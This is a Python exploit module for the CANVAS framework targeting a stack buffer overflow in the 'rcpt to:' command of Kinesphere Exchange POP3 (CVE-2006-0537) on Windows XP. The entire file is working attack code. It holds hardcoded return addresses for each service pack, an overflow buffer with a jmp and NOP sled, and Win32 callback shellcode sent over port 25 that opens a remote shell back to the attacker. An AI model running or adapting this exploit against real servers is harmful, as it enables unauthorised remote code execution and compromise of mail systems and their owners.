#! /usr/bin/env python
#this exploit was made with visualsploit.
#
#ntdll
#77F459CD   5B               POP EBX
#77F459CE   5D               POP EBP
#77F459CF   C3               RETN
#
#
import sys 
sys.path.append(".")
sys.path.append("../../")
sys.path.append("../../encoder")
sys.path.append("./encoder")
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
import os
import getopt
import socket
import sys
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
import addencoder
import win32shell
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
from socket import *
import mosdef 
from mosdefutils import *

NAME= "Exchange pop3 rcpt to overflow"
DESCRIPTION= "Exchangepop3 Stack Based overflow in rcpt to: command"
VERSION= "5.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="Kinesphere"
DOCUMENTATION["Date public"]=""
DOCUMENTATION["Repeatability"]=""
DOCUMENTATION["References"] = "http://www.morx.org/adv.txt"
DOCUMENTATION["CVE Name"] = "CVE-2006-0537"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0537"
DOCUMENTATION['CVSS'] = 7.5

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["VERSION"]= ["XP"]
GTK2_DIALOG="dialog.glade2"
runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

targets = {
    0 : ["Windows XP SP1 EN", 0x77D499DD],
    1 : ["Windows XP SP0 EN", 0x77F54F7B]
    }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        # localhost and localport used in shellcode
        self.callbackip = ""
        self.localhost = ""
        self.host = "127.0.0.1"
        self.port = 80
        self.callbackport = 1
        self.localport = 1
        self.covertness = 0
        self.version = 0
        self.badstring = ""
        self.connectionList = []
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.xpacket1badchars="%\x00\x0a\x0d><"
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcodexPacket1(self):
        badstring = self.xpacket1badchars
        self.createWin32Shellcode(badstring, self.localhost, self.localport)
        return self.shellcode
    def createxPacket1(self):
        buf = '' 
        buf+="rcpt to: <"
        buf+= "A" * 4098
        buf+=mosdef.assemble("jmp $8", "X86")
        self.info,self.eip = targets[self.version]
        buf+= intel_order(self.eip)
        buf+= "\x90" * 10
        buf+=self.createShellcodexPacket1()
        buf+= "C" * 2000
        buf+="\n"
        return buf

    def test(self):
        pass

    def run(self):
        self.port=25
        try:

            self.host = self.target.interface

        except:

            self.host="localhost"
        self.port = int(self.argsDict.get("port", self.port))
        FD_1 = self.gettcpsock()
        self.log("connect(%s,%s)" % (self.host, self.port))
        try:
            FD_1.connect((self.host,self.port))
        except:
            self.log("Could not connect")
            return 0
        self.log("Connected!")
        recv_buf=FD_1.recv(50)
        self.log("received: %s." %recv_buf)
        sendbuf="mail\n"
        self.log("sending string...")
        FD_1.send(sendbuf)
        recv_buf=FD_1.recv(50)
        self.log("received: %s." %recv_buf)
        if recv_buf.find("250") > -1:
                self.log("ARGH")
                xpacket1buf=self.createxPacket1()
                self.log("sending packet...")
                FD_1.send(xpacket1buf)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port))
            return 1
        self.setInfo("%s attacking %s:%d (failed!)" % (self.name, self.host, self.port))
        return 0

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
